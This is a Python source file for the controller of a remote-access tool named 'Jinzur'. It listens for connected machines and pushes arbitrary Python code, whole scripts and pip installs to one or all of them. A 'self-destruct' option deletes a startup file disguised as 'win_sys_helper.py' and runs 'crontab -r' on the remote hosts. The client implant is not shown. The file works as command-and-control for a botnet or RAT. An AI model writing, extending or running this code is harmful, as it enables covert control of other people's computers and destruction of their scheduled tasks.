import socket
import threading
import os
print("Welcome to Jinzur! Made by Chucny")
# --- CONFIG ---
SERVER_IP = "0.0.0.0" # Listen on all network cards
PORT = 5555
clients = {} # { (IP, Port): socket_object }

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((SERVER_IP, PORT))
    server.listen()
    print(f"[*] Controller Online. Listening on {PORT}...")
    while True:
        conn, addr = server.accept()
        clients[addr] = conn
        print(f"\n[+] New Connection from: {addr[0]}")

# Start listener in background
threading.Thread(target=start_server, daemon=True).start()

def send_payload(target_addr, p_type, content):
    conn = clients.get(target_addr)
    if conn:
        try:
            # Format: TYPE|CONTENT
            payload = f"{p_type}|{content}"
            conn.send(payload.encode())
            print(f"[!] Sent {p_type} to {target_addr[0]}")
        except:
            print(f"[-] Connection to {target_addr[0]} failed.")
            del clients[target_addr]

while True:
    print("\n--- PI/PC MASTER CONTROLLER ---")
    print("1. List Connected Devices")
    print("2. Run Python Line (exec)")
    print("3. Run Local .py File")
    print("4. Remote Pip Install")
    print("5. SELF-DESTRUCT (Remove from Startup & Exit)")
    choice = input("Select: ")

    if choice == "1":
        print("Connected Devices:", list(clients.keys()))
    
    elif choice in ["2", "3", "4", "5"]:
        target_input = input("Target IP (or 'all'): ")
        
        # Filter target list
        if target_input == "all":
            target_list = list(clients.keys())
        else:
            target_list = [addr for addr in clients.keys() if addr[0] == target_input]

        if not target_list:
            print("Target not found.")
            continue

        if choice == "2":
            code = input("Enter Python code: ")
            for addr in target_list: send_payload(addr, "CODE", code)
        
        elif choice == "3":
            path = input("Path to .py file: ")
            if os.path.exists(path):
                with open(path, "r") as f: data = f.read()
                for addr in target_list: send_payload(addr, "FILE", data)
            else: print("File error.")
            
        elif choice == "4":
            lib = input("Library name: ")
            for addr in target_list: send_payload(addr, "PIP", lib)

        elif choice == "5":
            confirm = input("Type 'YES' to wipe all startup files: ")
            if confirm == "YES":
                # This code runs on the remote client to delete itself
                sd_code = """
import os, sys, subprocess
if sys.platform == 'win32':
    p = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', 'win_sys_helper.py')
    if os.path.exists(p): os.remove(p)
else:
    subprocess.run('crontab -r', shell=True)
sys.exit()
                """
                for addr in target_list: send_payload(addr, "CODE", sd_code)
                print("[!] Self-destruct signal sent.")
